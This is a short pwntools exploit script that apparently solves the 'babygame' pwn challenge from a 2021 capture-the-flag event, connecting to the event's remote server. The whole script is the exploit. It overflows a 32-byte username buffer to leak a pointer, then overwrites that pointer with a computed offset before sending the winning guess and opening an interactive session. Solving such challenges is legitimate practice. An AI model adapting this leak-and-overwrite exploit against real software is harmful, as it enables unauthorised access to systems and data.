#!/bin/python3

from pwn import *

DIFF = 0x207c

#io = process('./babygame')
io = remote('pwn-2021.duc.tf', 31907)

io.send(b'a'*0x20)
io.send(b'2')

leak = io.recvuntil(b'> ')
leak = io.recvuntil(b'> ')
leak = leak.split(b'\n')[0]
leak = leak[-6:]
leak = u64(leak + b'\x00\x00')
print('leak', hex(leak))

io.sendline(b'1')
io.sendafter(b'username to?', b'.\x00' + b'a'*(0x20-2) + p64(leak + DIFF))

io.sendlineafter(b'> ', b'1337')
io.sendlineafter(b'guess:', b'0')

io.interactive()
